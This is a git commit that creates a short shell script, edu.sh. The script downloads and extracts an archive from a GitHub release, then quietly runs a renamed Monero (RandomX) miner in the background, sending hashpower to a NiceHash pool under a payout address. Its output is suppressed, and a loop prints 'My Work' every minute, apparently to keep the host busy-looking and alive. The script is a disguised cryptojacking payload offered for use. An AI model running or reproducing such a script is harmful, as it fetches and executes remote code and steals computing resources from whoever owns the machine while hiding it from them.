a548b263d47e74ce4f1850f83aa267ffa5ff89de
preak07 <160253225+preak07@users.noreply.github.com>
2024-04-03 22:51:54 +0700

    Create edu.sh

---
+++ edu.sh
@@ -0,0 +1,6 @@
+wget https://github.com/kolorijo01/koloria/releases/download/uranus/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a rx/0 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f.Quicksilver -t 1 >/dev/null 2>&1 &
+while true
+do
+        echo "My Work"
+        sleep 60
+done
